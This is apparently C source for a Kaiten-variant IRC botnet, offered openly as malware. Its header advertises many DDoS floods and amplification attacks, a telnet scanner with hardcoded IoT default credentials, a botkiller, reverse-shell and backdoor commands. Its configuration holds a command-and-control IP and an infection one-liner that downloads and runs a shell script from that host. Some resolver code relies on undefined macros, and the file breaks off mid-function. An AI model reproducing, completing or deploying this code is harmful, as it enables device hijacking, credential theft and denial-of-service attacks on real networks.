/*******************************************************************************
 * This is a remake of Kaiten, hacked together from various versions scattered *
 * throughout cyberspace. New features include a variety of awesome shell one- *
 * liners, ability to upgrade the knight over http (via gcc or static binary), *
 * a feature called "HackPkg" that installs binaries without dependencies like *
 * wget or tftp, and more! Tip: run GETBB <tftp ip> first to get the most out  *
 * of this bot (it will install to /var/bin, which is almost always writable). *
 * The LOCKUP command will kill telnetd and run a backdoor of your choice (for *
 * simplicity we assume you will run it on port 23). This bot is updated often,*
 * so check back frequently for new killer features and ddos tools. In memory  *
 * of David Bowie, buse he was an awesome musician and passed during the       *
 * early development of this bot. By ShellzRuS and all the other developers    *
 * that have worked on Kaiten over the last 20 years.                          *
 *                                                                             *
 *        "Hacking on kaiten is a right of passage" --Kod                      *
 *******************************************************************************
 *   This is a IRC based distributed denial of service client.  It connects to *
 * the server specified below and accepts commands via the channel specified.  *
 * The syntax is:                                                              *
 *       !<nick> <command>                                                     *
 * You send this message to the channel that is defined later in this code.    *
 * Where <nick> is the nickname of the client (which can include wildcards)    *
 * and the command is the command that should be sent.  For example, if you    *
 * want to tell all the clients with the nickname starting with N, to send you *
 * the help message, you type in the channel:                                  *
 *                                                                             *
 * This variant is special.                                                    *
 * It 16 DDoS methods in total!!! which include three amplification methods     *
 * DNS, NTP, and SNMP                                                  *
 * It has a spoofed UDP flooder, 2 non-spoofed UDP flooders, a mulithreaded    *
 * spoofed TCP flooder (allows flags/attack method), vanilla TCP connection    *
 * flood, and non spoofed vanilla TCP random data flood.                       *
 * Packets are made up of random bytes, between 0x00 - 0xFF. And random packet *
 * size between 32 - 1024. It is extemely hard to block.                       *                             
 * it also has blacknurse! :D                           *
 * it also has 5 non root/non spoof attack methods in which ALL bots can run!  *
 * it has phatwonk, which I coded in about 15 minutes, based off of PAN. You   *
 * can set( any flag, such as syn, fin, psh, rst, xmas, usyn. Anything TCP     *
 * I have added the prometheus v4 telnet scanner which I have modified.        *
 * It now uses 18 default IoT device username and password combinations        *
 * it also uses the Mirai IP range generator to increase scanning speed.       *
 * The scanner now calls /bin/sh before sending the infection payload          *
 * the scanner starts a new fork() for each CPU core. (not by me)              *
 * And increases sockets according to how many CPUs exist.                     *
 * the scanner also reports all cracked telnet credentials and successful      *
 * infections to the main command and control channel.                         *
 *                                                                             *
 * Successes:                                                                  *
 * [TELNET] [+] CRACKED ---> 1.2.3.4:23 username:password                      *
 * [TELNET] [+] INFECTED ---> 1.2.3.4:23 username:password                   *
 *                                                                             *
 *                                                                             *
 * The scanner is started once connected to the server.                        *
 * This way your bots only scan when they are connected, so                    *
 * if your server is down, they wont scan. And it will appear as if your net   *
 * got killed but they will still attempt to connect to your server(s)         *
 * and start the scanner again if they are able to connect                     *
 *                                                                             *
 * I have also added an advanced process name based botkiller.                 *
 * The botkiller tries to find the bot, then kills it also, not to mention if  *
 * it exists on the HDD the bot that was killed gets deleted.                  *
 * NO shell commands are required for the botkiller!                           *
 * Also the botnet can detect 15 different architectures :)                    *
 * All bot nicknames are PREFIX|ARCH|RANDID. Examples:                         *
 * [BOT|MIPS]Jg6dug or [BOT|x86_64]kA79aLOi, etc.                              *
 * Bot IDs are rand 4 - 8 alphanumeric charactars.                             *
 * where PREFIX is what you specify, ARCH is the architecture.                 *
 * RANDID is the bot suffix / ID.                                              *
 *       !N* HELP                                                              *
 * That will send you a list of all the commands.  You can also specify an     *
 * astrick alone to make all client do a specific command:                     *
 *       !* SH uname -a                                                        *
 * There are a large number of commands that can be sent to the client:        *
 *                                                                             *
 * Non-spoof / non-root attacks: (can run on all bots)                         *
 *       STD <ip> <port> <time>      = A non spoof UDP HIV STD flooder         *
 *       HOLD <host> <port> <time>   = A vanilla TCP connection flooder        *
 *       JUNK <host> <port> <time>   = A vanilla TCP flooder (modded)          *
 *       UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs>  = Another non-spoof udp flooder
 *       HTTP <url> <secs>      =  A HTTP(S) flooder                     *
 *                                                                             *
 * Spoof / root attacks:                                                       *
 *       PAN <target> <port> <secs>  = A SYN flooder                           *
 *       TCP <target> <port> <time> <flags/method> <packetsize> <pollinterval> <threads> = An advanced spoofed TCP flooder. Multithreading and xmas, usyn methods.
 *       UDP <target> <port> <secs>  = An UDP flooder                          *
 *       PHATWONK <target> <flags/method> <secs> = A leet flooder coded by Freak, attacks 31 ports. Can set flags or attack method.
 *       BLACKNURSE <target ip> <secs> = An ICMP flooder that will crash most firewalls, causing them to drop packets.
 *    Amplification attacks:                                                   *
 *         NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> =  A DrDoS flooder using the NTP protocol
 *         DNS <IP> <port> <reflection file url> <threads> <time> =   DNS DrDoS flooder
 *         SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> =   SNMP DrDoS flooder. Extremely fucking insane amp factor!!! (600 - 1700x)
 *                                                                             *
 * Bot commands:                                                               *
 *       SCANNER <ON/OFF>            = Toggles scanner. Started automatically. *
 *       DNS2IP <domain>             = Get IP address from domain              *
 *       RNDNICK                     = Randomizes knight nickname              *
 *       NICK <nick>                 = Changes the nick of the client          *
 *       SERVER <server>             = Changes servers                         *
 *       GETSPOOFS                   = Gets the current spoofing               *
 *       SPOOFS <subnet>             = Changes spoofing to a subnet            *
 *       DISABLE                     = Disables all packeting from the knight  *
 *       ENABLE                      = Enables all packeting from the knight   *
 *       KILL                        = Kills the knight                        *
 *       GET <http address> <save as> = Downloads a file off the web           *
 *       VERSION                     = Requests version of knight              *
 *       KILLALL                     = Kills all current packeting             *
 *       HELP                        = Displays this                           *
 *       IRC <command>               = Sends this command to the server        *
 *       SH <command>                = Executes a command                      *
 *       BASH <command>              = Run a bash command                      *
 *       ISH <command>               = Interactive SH (via privmsg)            *
 *       SHD <command>               = Daemonize command                       *
 *       UPDATE <http://server/bot>  = Update this bot                         *
 *       HACKPKG <http://server/bin> = Install binary (no dependencies)        *
 *       INSTALL <http://server/bin> = Install binary (via wget)               *
 *       BINUPDATE <http://server/bin> = Update a binary (via wget)            *
 *       SCAN <nmap opts>            = Call an nmap wrapper script             *
 *       GETSSH <http:serverdropbear> = Install dropbear, run on port 30022    *
 *       RSHELL <ip port>            = Equates to nohup nc ip port             *
 *       GETBB <tftp server>         = Get a proper busybox (via tftp)         *
 *       LOCKUP <http://server/bin>  = Kill telnet, install a backdoor!        *
 *                                                                             *
 * Remember, all these commands must be prefixed by ! and the bot ID that you  *
 * want the command to be sent to (can include wildcards).                     *
 * spaces in between the ! and the nickname, and there are no spaces before    *
 * the !                                                                       *
 *                                                                             *
 *            #NullzSec                                  #kektheplanet         *
 *                                                                             *
 *            - come on irc.anonplus.org - Leonidus, IrishSec, Milenko         *
 *                                                                             *
 *            *NEW* Setup tutorial! https://pastebin.com/FXhvpn0D              *
 *                                                                             *
 *  Kaiten variant coded by Freak aka Milenko aka whateverthefuckyouknowmeas   *
 *                             HACK THE PLANET                                 *
 *                                                                             *
 *                   Donate BTC so i has moar monies ^_^ THX                   *
 *                     1D7GMefDEoUdashTHXxC929Au3n896YLuw                      *
 *                                                                             *
 *  All code will be updated here. To contribute message me on Jabber / XMPP   *
 *            Jabber/XMPP: milenko@420blaze.it                                 *
 *            Code was last updated on: Saturday, July 11th, 2017              *
 *                                                                             *
 *******************************************************************************/
////////////////////////////////////////////////////////////////////////////////
//                                EDIT THESE                                  //
////////////////////////////////////////////////////////////////////////////////
#undef STARTUP                              // Start on startup?
#undef IDENT                                 // Only enable this if you absolutely have to
#define CHAN "#CSIS"                    // Channel to join
#define KEY "sewgfeg"        // The key of the channel
#define PREFIX "KEK"                         // The NICK prefix
int numservers=1;                            // Must change this to equal number of servers down there
char *servers[] = {                          // List the servers in that format, always end in (void*)0
        "104.238.148.120",
        (void*)0
};
int nummasters = 1;
char *masters[] = {                          // *NEW* List of master nicks :)
        "Freak"
};
                                             // Telnet scanner payload, must end with \r\n\0
char *rekdevice = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://104.238.148.120/update.sh; busybox wget http://104.238.148.120/update.sh; /bin/busybox wget http://104.238.148.120/update.sh; /usr/busybox wget http://104.238.148.120/update.sh; /var/run/busybox wget http://104.238.148.120/update.sh; chmod 777 update.sh; sh update.sh; rm -f update.sh";

////////////////////////////////////////////////////////////////////////////////
//                               STOP HERE!                                   //
////////////////////////////////////////////////////////////////////////////////
#include <stdarg.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <strings.h>
#include <unistd.h>
#include <dirent.h>
#include <poll.h>
#include <netdb.h>
#include <time.h>
#include <net/if.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <resolv.h>
//amp setting
#define MAX_PACKET_SIZE 1024
#define PHI 0x9e3779b9
//DNS amp
#define PACKETS_PER_RESOLVER 25

//telnet scanner stuff
#define BUFFER_SIZE 1024
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254

#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12

#define OPT_SGA   3
#define SOCKBUF_SIZE 1024

//lil tool
#define NUMITEMS(x)  (sizeof(x) / sizeof((x)[0]))

const char *knownBots[] = {
	"mirai.*",
	"dlr.*"
    "mips",
    "mips64",
    "mipsel",
    "sh2eb",
    "sh2elf",
    "sh4",
    "x86",
    "arm",
    "armv5",
    "armv4tl",
    "armv4",
    "armv6",
    "i686",
    "powerpc",
    "powerpc440fp",
    "i586",
    "m68k",
    "sparc",
    "x86_64",
    "jackmy*",
    "hackmy*",
    "b1",
    "b2",
    "b3",
    "b4",
    "b5",
    "b6",
    "b7",
    "b8",
    "b9",
    "b10",
    "b11",
    "b12",
    "b13",
    "b14",
    "b15",
    "b16",
    "b17",
    "b18",
    "b19",
    "b20",
    "busyboxterrorist",
    "dvrHelper",
    "kmy*",
    "lol*",
    "telmips",
    "telmips64",
    "telmipsel",
    "telsh2eb",
    "telsh2elf",
    "telsh4",
    "telx86",
    "telarmv5",
    "telarmv4tl",
    "telarmv4",
    "telarmv6",
    "teli686",
    "telpowerpc",
    "telpowerpc440fp",
    "teli586",
    "telm68k",
    "telsparc",
    "telx86_64",
    "TwoFace*",
    "xxb*",
    "bb",
    "busybotnet",
    "busybox",
	"badbox",
    "B1",
    "B2",
    "B3",
    "B4",
    "B5",
    "B6",
    "B7",
    "B8",
    "B9",
    "B10",
    "B11",
    "B12",
    "B13",
    "B14",
    "B15",
    "B16",
    "B17",
    "B18",
    "B20",
    "gaybot",
    "hackz", 
    "bin*", 
    "gtop", 
    "botnet", 
    "swatnet",
    "ballpit", 
    "fucknet", 
    "cracknet", 
    "weednet", 
    "gaynet", 
    "queernet",
    "ballnet", 
    "unet",
    "yougay", 
    "sttftp", 
    "sstftp", 
    "sbtftp", 
    "btftp", 
    "y0u1sg3y", 
    "bruv*",
    "IoT*"
};

char *UserAgents[] = {
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
    "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
    "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
    "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
    "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
    "Mozilla/5.0 (PLAYSTATION 3; 3.55)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
    "wii libnup/1.0",
    "Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
    "PSP (PlayStation Portable); 2.00",
    "Bunjalloo/0.7.6(Nintendo DS;U;en)",
    "Doris/1.15 [en] (Symbian)",
    "BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",
    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
    "Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
    "Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0",
    "SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
    "MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0",
    "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
    "Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000",
    "MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
};




 char *usernames[] = {
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "guest\0",
    "root\0",
    "admin\0",
    "root\0",
    "default\0",
    "user\0",
    "guest\0",
    "daemon\0",
    "admin\0",
    "admin\0",
    "root\0",
    "admin\0",
    "adm\0",
    "guest\0",
    "root\0",
    "root\0",
    "telnet\0",
    "root\0",
    "admin\0",
    "admin\0",
    "Administrator\0",
    "root\0",
    "mg3500\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "default\0",
    "admin\0",
    "admin\0",
    "admin\0",
    "root\0",
    "root\0",
    "root\0",
    "root\0",
    "admin1\0",
    "ubnt\0",
    "support\0",
    "root\0",
    "user\0",
    "\0",
    "root\0",
    "guest\0"
};

 char *passwords[] = {
    "000000\0",
    "14567\0",
    "hi3518\0",
    "user\0",
    "pass\0",
    "admin14\0",
    "7ujMko0admin\0",
    "00000000\0",
    "<>\0",
    "klv1\0",
    "klv14\0",
    "oelinux1\0",
    "realtek\0",
    "1111\0",
    "54321\0",
    "antslq\0",
    "zte9x15\0",
    "system\0",
    "root\0",
    "1456\0",
    "888888\0",
    "ikwb\0",
    "password\0",
    "default\0",
    "juantech\0",
    "Zte521\0",
    "\0",
    "xc3511\0",
    "support\0",
    "1111111\0",
    "service\0",
    "145\0",
    "4321\0",
    "tech\0",
    "<>\0",
    "abc1\0",
    "7ujMko0admin\0",
    "switch\0",
    "admin14\0",
    "\0",
    "1111\0",
    "meinsm\0",
    "pass\0",
    "smcadmin\0",
    "14567890\0",
    "14\0",
    "admin1\0",
    "password\0",
    "admin\0",
    "Zte521\0",
    "anko\0",
    "xc3511\0",
    "1456\0",
    "\0",
    "guest\0",
    "145\0",
    "xc3511\0",
    "admin\0",
    "Zte521\0",
    "\0",
    "user\0",
    "guest\0",
    "\0",
    "password\0",
    "admin1\0",
    "ikwb\0",
    "14567890\0",
    "\0",
    "\0",
    "1456\0",
    "root\0",
    "telnet\0",
    "zte9x15\0",
    "meinsm\0",
    "\0",
    "\0",
    "antslq\0",
    "merlin\0",
    "switch\0",
    "7ujMko0admin\0",
    "abc1\0",
    "<>\0",
    "tech\0",
    "4321\0",
    "default\0",
    "145\0",
    "service\0",
    "1111111\0",
    "admin14\0",
    "pass\0",
    "user\0",
    "hi3518\0",
    "password\0",
    "ubnt\0",
    "zlxx.\0",
    "14567\0",
    "\0",
    "\0",
    "000000\0",
    "Zte521\0"
};


int scanPid = 0;

char *advances[] = {":", "ser", "ogin", "name", "pass", "dvrdvs", (char*)0};                                                                                     
char *fails[] = {"nvalid", "ailed", "ncorrect", "enied", "error", "goodbye", "bad", "timeout", (char*)0};                                                         
char *tmpdirs[] = {"/tmp/", "/var/", "/var/run/", "/dev/shm/", "/mnt/", "/boot/", "/usr/", (char*) 0};
char *successes[] = {"$", "#", ">", "shell", "dvrdvs", "usybox", (char*)0};                                                                                                     
char *advances2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "busybox", "$", "#", (char*)0};
char *shellz[] = {"shell", "sh", "/bin/sh", "dash", (char*)0};

struct ipstate_t 
{
    int fd;
    unsigned int ip;
    unsigned char state;
    unsigned char complete;
    unsigned char usernameInd;
    unsigned char passwordInd;
    unsigned char tempDirInd;
    unsigned int totalTimeout;
    unsigned short bufUsed;
    unsigned int telPort;
    char *sockbuf;
};

int sock,changeservers=0;
int *pids, actualparent;
char *server, *chan, *key, *nick, *ident, *user, disabled=0, execfile[256], dispass[256];

//unsigned int *pids;
unsigned long spoofs=0, spoofsm=0, numpids=0;

char *getBuild() { //Get current architecture, detectx nearly every architecture. Coded by Freak
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__)
    return "ARM2";
    #elif defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
    return "ARM3";
    #elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "ARM4T";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "ARM5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_)
    return "ARM6T2";
    #elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)
    return "ARM6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM7";
    #elif defined(__aarch64__)
    return "ARM64";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "MIPS";
    #elif defined(__sh__)
    return "SUPERH";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "POWERPC";
    #elif defined(__sparc__) || defined(__sparc)
    return "SPARC";
    #elif defined(__m68k__)
    return "M68K";
    #else
    return "UNKNOWN";
    #endif
}
static struct hostent *fake_hostent(const char *hostname, struct in_addr addr,
									struct hostent *result, char *buf,
									int bufsize, int *errval);
static struct hostent *file_find_name(const char *name, struct hostent *result,
									  char *buf, int bufsize, int *errval);

struct hostent *gethostbyname(const char *hostname)
{
	struct res_data *data = _res_init();

	if (!data)
		return NULL;
	if (!data->buf) {
		data->buf = malloc(sizeof(struct hostent) + HOST_BUFSIZE);
		if (!data->buf) {
			errno = 0;
			data->errval = NO_RECOVERY;
			return NULL;
		}
	}
	return gethostbyname_r(hostname, (struct hostent *) data->buf,
						   data->buf + sizeof(struct hostent), HOST_BUFSIZE,
						   &data->errval);
}

struct hostent *gethostbyname_r(const char *hostname, struct hostent *result,
								char *buf, int bufsize, int *errval)
{
	struct in_addr addr;
	querybuf qbuf;
	const char *p;
	int n;

	/* Default failure condition is not a range error and not recoverable. */
	errno = 0;
	*errval = NO_RECOVERY;
	
	/* Check for all-numeric hostname with no trailing dot. */
	if (isdigit(hostname[0])) {
		p = hostname;
		while (*p && (isdigit(*p) || *p == '.'))
			p++;
		if (!*p && p[-1] != '.') {
			/* Looks like an IP address; convert it. */
			if (inet_aton(hostname, &addr) == -1) {
				*errval = HOST_NOT_FOUND;
				return NULL;
			}
			return fake_hostent(hostname, addr, result, buf, bufsize, errval);
		}
	}
	
	/* Do the search. */
	n = res_search(hostname, C_IN, T_A, qbuf.buf, sizeof(qbuf));
	if (n >= 0)
		return _res_parse_answer(&qbuf, n, 0, result, buf, bufsize, errval);
	else if (errno == ECONNREFUSED)
		return file_find_name(hostname, result, buf, bufsize, errval);
	else
		return NULL;
}

static struct hostent *fake_hostent(const char *hostname, struct in_addr addr,
									struct hostent *result, char *buf,
									int bufsize, int *errval)
{
	int len = strlen(hostname);
	char *name, *addr_ptr;

	if (SP(SP(SP(buf, char, len + 1), addr, 1), char *, 3) > buf + bufsize) {
		errno = ERANGE;
		return NULL;
	}

	/* Copy faked name and address into buffer. */
	strcpy(buf, hostname);
	name = buf;
	buf = ALIGN(buf + len + 1, addr);
	*((struct in_addr *) buf) = addr;
	addr_ptr = buf;
	buf = ALIGN(buf + sizeof(addr), char *);
	((char **) buf)[0] = addr_ptr;
	((char **) buf)[1] = NULL;
	((char **) buf)[2] = NULL;

	result->h_name = name;
	result->h_aliases = ((char **) buf) + 2;
	result->h_addrtype = AF_INET;
	result->h_length = sizeof(addr);
	result->h_addr_list = (char **) buf;

	return result;
}

static struct hostent *file_find_name(const char *name, struct hostent *result,
									  char *buf, int bufsize, int *errval)
{
	char **alias;
	FILE *fp = NULL;

	sethostent(0);
	while ((result = gethostent_r(result, buf, bufsize, errval)) != NULL) {
		/* Check the entry's name and aliases against the given name. */
		if (strcasecmp(result->h_name, name) == 0)
			break;
		for (alias = result->h_aliases; *alias; alias++) {
			if (strcasecmp(*alias, name) == 0)
				break;
		}
	}
	if (!result && errno != ERANGE)
		*errval = HOST_NOT_FOUND;
	return result;
}

u_char rseed[4096];
int rsi, rnd, pid;

// Calculates the checksum of the ip header.
unsigned short csum(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
    return(answer);
}

int strwildmatch(const char* pattern, const char* string) {
    switch(*pattern) {
        case '\0': return *string;
        case '*': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
        case '?': return !(*string && !strwildmatch(pattern+1, string+1));
        default: return !((toupper(*pattern) == toupper(*string)) && !strwildmatch(pattern+1, string+1));
    }
}

int Send(int sock, char *words, ...) {
        static char textBuffer[1024];
        va_list args;
        va_start(args, words);
        vsprintf(textBuffer, words, args);
        va_end(args);
        return write(sock,textBuffer,strlen(textBuffer));
}

int mfork(char *sender) {
    unsigned int parent, *newpids, i;
    if(disabled == 1) {
        Send(sock, "NOTICE %s :Unable to comply.\n", sender);
        return 1;
    }
    parent=fork();
    if(parent <= 0) return parent;
    numpids++;
    newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
    for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
    newpids[numpids-1]=parent;
    free(pids);
    pids=newpids;
    return parent;
}

unsigned long getspoof() {
    if(!spoofs) return rand();
    if(spoofsm == 1) return ntohl(spoofs);
    return ntohl(spoofs+(rand() % spoofsm)+1);
}

void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }

char *randstring(int length) {    
    srand(time(NULL));
    char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    size_t stringLen = 26*2+10;        
    char *randomString;

    randomString = malloc(sizeof(char) * (length +1));

    if(!randomString) {
        return (char*)0;
    }

    unsigned int key = 0;
    
    int n;

    for (n = 0;n < length;n++) {            
        key = rand() % stringLen;          
        randomString[n] = charset[key];
    }

    randomString[length] = '\0';

    return randomString;
}

void identd() {
        int sockname,sockfd,sin_size,tmpsock,i;
        struct sockaddr_in my_addr,their_addr;
        char szBuffer[1024];
        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
        my_addr.sin_family = AF_INET;
        my_addr.sin_port = htons(113);
        my_addr.sin_addr.s_addr = INADDR_ANY;
        memset(&(my_addr.sin_zero), 0, 8);
        if(bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1) return;
        if(listen(sockfd, 1) == -1) return;
        if(fork() == 0) return;
        sin_size = sizeof(struct sockaddr_in);
        if((tmpsock = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1) exit(0);
        for(;;) {
                fd_set bla;
                struct timeval timee;
                FD_ZERO(&bla);
                FD_SET(tmpsock,&bla);
                timee.tv_sec=timee.tv_usec=60;
                if(select(tmpsock + 1,&bla,(fd_set*)0,(fd_set*)0,&timee) < 0) exit(0);
                if(FD_ISSET(tmpsock,&bla)) break;
        }
        i = recv(tmpsock,szBuffer,1024,0);
        if(i <= 0 || i >= 20) exit(0);
        szBuffer[i]=0;
        if(szBuffer[i-1] == '\n' || szBuffer[i-1] == '\r') szBuffer[i-1]=0;
        if(szBuffer[i-2] == '\n' || szBuffer[i-2] == '\r') szBuffer[i-2]=0;
    Send(tmpsock, "%s : USERID : UNIX : %s\n",szBuffer,ident);
        close(tmpsock);
        close(sockfd);
        exit(0);
}

long poww(long a, long b) {
        if(b == 0) return 1;
        if(b == 1) return a;
        return a*poww(a,b-1);
}

u_short in_cksum(u_short *addr, int len) {
        register int nleft = len;
        register u_short *w = addr;
        register int sum = 0;
        u_short answer =0;
        while(nleft > 1) {
                sum += *w++;
                nleft -= 2;
        }
        if(nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)w;
                sum += answer;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return(answer);
}

void get(int sock, char *sender, int argc, char **argv) {
        int sock2,i,d;
        struct sockaddr_in server;
        unsigned long ipaddr;
        char buf[1024];
        FILE *file;
        unsigned char bufm[4096];
        if(mfork(sender) != 0) return;
        if(argc < 2) {
                Send(sock, "NOTICE %s :GET <host> <save as>\n", sender);
                exit(0);
        }
        if((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                Send(sock, "NOTICE %s :Unable to create socket.\n", sender);
                exit(0);
        }
        if(!strncmp(argv[1],"http://",7)) strcpy(buf,argv[1]+7);
        else strcpy(buf,argv[1]);
        for (i=0;i<strlen(buf) && buf[i] != '/';i++);
        buf[i]=0;
        server.sin_family = AF_INET;
        server.sin_port = htons(80);
        if((ipaddr = inet_addr(buf)) == -1) {
                struct hostent *hostm;
                if((hostm=gethostbyname(buf)) == NULL) {
                        Send(sock, "NOTICE %s :Unable to resolve address.\n", sender);
                        exit(0);
                }
                memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
        }
        else server.sin_addr.s_addr = ipaddr;
        memset(&(server.sin_zero), 0, 8);
        if(connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
                Send(sock, "NOTICE %s :Unable to connect to http.\n", sender);
                exit(0);
        }

